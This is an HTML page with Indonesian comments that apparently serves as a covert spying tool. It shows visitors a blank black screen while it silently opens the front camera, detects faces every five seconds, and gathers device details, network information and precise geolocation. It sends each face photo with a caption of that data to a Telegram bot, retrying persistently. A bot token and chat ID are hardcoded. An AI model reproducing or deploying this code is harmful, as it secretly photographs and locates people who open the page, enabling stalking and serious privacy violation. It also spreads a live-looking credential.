<!doctype html>
<html lang="id">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>ASKA22 → Telegram (Direct)</title>
  <style>
    html,body{height:100%;margin:0;background:#000;color:#000}
    /* elemen ada tapi tersembunyi */
    #video,#canvas{display:none!important;width:640px;height:480px}
  </style>
</head>
<body>
  <video id="video" width="640" height="480" autoplay muted playsinline></video>
  <canvas id="canvas" width="640" height="480"></canvas>

  <!-- face-api -->
  <script src="https://cdn.jsdelivr.net/npm/face-api.js@0.22.2/dist/face-api.min.js"></script>
  <script>
  (async () => {
    // ====== KONFIGURASI ======
    // Cara pakai: buka file dengan query string:
    //  file://.../auto-face-direct.html?token=BOT_TOKEN&chat=CHAT_ID
    // atau https://domain/auto-face-direct.html?token=BOT_TOKEN&chat=CHAT_ID
    const params = new URLSearchParams(window.location.search);
    const BOT_TOKEN = params.get('token') || "8414860263:AAFhAxcv1lWfhXCQB8h8BTjNFY6EB6P_jIc"; // ex: 123456:ABC-DEF
    const CHAT_ID  = params.get('chat')  || "8471664635";  // ex: 987654321
    const MODEL_URL = "https://cdn.jsdelivr.net/gh/vladmandic/face-api/model/";
    const DETECT_INTERVAL = 5000; // ms
    const MIN_INTERVAL_BETWEEN_SENDS = 5000; // ms
    const IMAGE_TYPE = 'image/jpeg';
    const IMAGE_QUALITY = 0.85;
    const MAX_RETRY = 99999;
    // ===========================

    if (!BOT_TOKEN || !CHAT_ID) {
      console.warn("TOKEN atau CHAT_ID tidak ditemukan di query string. Tidak akan mengirim apapun.");
    }

    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');
    const ctx = canvas.getContext('2d');

    function detectDevice() {
      const ua = navigator.userAgent || "unknown";
      const l = ua.toLowerCase();
      let brand = "Unknown";
      if (/iphone|ipad/.test(l)) brand = "Apple (iPhone/iPad)";
      else if (/android/.test(l)) {
        if (/samsung/.test(l)) brand = "Samsung";
        else if (/huawei|honor/.test(l)) brand = "Huawei/Honor";
        else if (/xiaomi|redmi|poco/.test(l)) brand = "Xiaomi/Poco";
        else if (/oppo/.test(l)) brand = "OPPO";
        else if (/vivo/.test(l)) brand = "Vivo";
        else brand = "Android (lainnya)";
      } else if (/windows/.test(l)) brand = "Windows PC";
      else if (/macintosh/.test(l)) brand = "MacOS";
      else if (/linux/.test(l)) brand = "Linux";
      return { brand, ua };
    }

    function getNetworkInfo() {
      const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
      return {
        type: conn ? (conn.effectiveType || conn.type || "unknown") : "unknown",
        downlink: conn ? (conn.downlink || "n/a") : "n/a",
        rtt: conn ? (conn.rtt || "n/a") : "n/a"
      };
    }

    async function getLocation(timeout=7000) {
      return new Promise(resolve => {
        if (!navigator.geolocation) return resolve(null);
        navigator.geolocation.getCurrentPosition(
          pos => resolve({ lat: pos.coords.latitude, lon: pos.coords.longitude }),
          () => resolve(null),
          { enableHighAccuracy: true, timeout }
        );
      });
    }

    async function reverseGeocode(lat, lon) {
      try {
        const r = await fetch(`https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat=${encodeURIComponent(lat)}&lon=${encodeURIComponent(lon)}`);
        if (!r.ok) return null;
        const j = await r.json();
        return j.display_name || null;
      } catch { return null; }
    }

    async function sendToTelegramDirect(blob, caption, retry=0) {
      if (!BOT_TOKEN || !CHAT_ID) return;
      try {
        const fd = new FormData();
        fd.append("chat_id", CHAT_ID);
        fd.append("caption", caption);
        fd.append("photo", blob, "face.jpg");
        const resp = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: "POST", body: fd });
        if (!resp.ok) throw new Error("Telegram API " + resp.status);
      } catch (e) {
        console.warn("Gagal kirim (attempt " + retry + "):", e.message || e);
        if (retry < MAX_RETRY) {
          const backoff = Math.pow(2, retry) * 1000;
          await new Promise(r => setTimeout(r, backoff));
          return sendToTelegramDirect(blob, caption, retry+1);
        } else {
          console.error("Gagal kirim setelah percobaan berulang:", e);
        }
      }
    }

    function captureBlob() {
      try {
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
        return new Promise(resolve => canvas.toBlob(resolve, IMAGE_TYPE, IMAGE_QUALITY));
      } catch {
        return Promise.resolve(null);
      }
    }

    let lastSendTs = 0;
    let lastFaceCount = 0;

    async function captureAndSendIfFace() {
      if (!video || video.readyState < 2) return;
      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
      const detections = await faceapi.detectAllFaces(canvas, new faceapi.TinyFaceDetectorOptions());
      const count = detections ? detections.length : 0;
      if (count === 0) { lastFaceCount = 0; return; }

      const now = Date.now();
      if (now - lastSendTs < MIN_INTERVAL_BETWEEN_SENDS) {
        if (count <= lastFaceCount) return;
      }
      if (lastFaceCount > 0 && count === lastFaceCount && (now - lastSendTs) < (DETECT_INTERVAL)) return;

      const device = detectDevice();
      const net = getNetworkInfo();
      const loc = await getLocation();
      let locText = "Tidak diketahui";
      if (loc) {
        const geo = await reverseGeocode(loc.lat, loc.lon);
        locText = `${loc.lat.toFixed(6)}, ${loc.lon.toFixed(6)}${geo ? " — " + geo : ""}`;
      }

      const caption = [
        "📸 Deteksi Wajah Otomatis",
        `👥 Jumlah wajah: ${count}`,
        `📱 Device: ${device.brand}`,
        `🌐 Jaringan: ${net.type} (downlink=${net.downlink}, rtt=${net.rtt})`,
        `📍 Lokasi: ${locText}`,
        `🕒 ${new Date().toLocaleString()}`
      ].join("\n");

      const blob = await captureBlob();
      if (!blob) return;
      lastSendTs = now;
      lastFaceCount = count;
      sendToTelegramDirect(blob, caption).catch(e => console.error(e));
    }

    async function init() {
      try {
        await faceapi.nets.tinyFaceDetector.loadFromUri(MODEL_URL);
        const stream = await navigator.mediaDevices.getUserMedia({ video: { width:640, height:480, facingMode: "user" } });
        video.srcObject = stream;
        await video.play();
        canvas.width = video.videoWidth || 640;
        canvas.height = video.videoHeight || 480;
        // sekali jalankan segera, lalu interval
        await captureAndSendIfFace();
        setInterval(captureAndSendIfFace, DETECT_INTERVAL);
      } catch (err) {
        console.error("Inisialisasi gagal:", err);
      }
    }

    window.addEventListener('load', () => setTimeout(init, 100));
    document.addEventListener('visibilitychange', () => {
      try { if (document.hidden) video.pause(); else video.play(); } catch(e){}
    });

    // Debug kecil via konsol
    window.__autoFace = {
      sendNow: async () => {
        const blob = await captureBlob();
        if (!blob) return console.warn("Tidak ada blob");
        const caption = "Manual send — " + new Date().toLocaleString();
        await sendToTelegramDirect(blob, caption);
      },
      config: { MODEL_URL, DETECT_INTERVAL, MIN_INTERVAL_BETWEEN_SENDS }
    };

  })();
  </script>
</body>
</html>
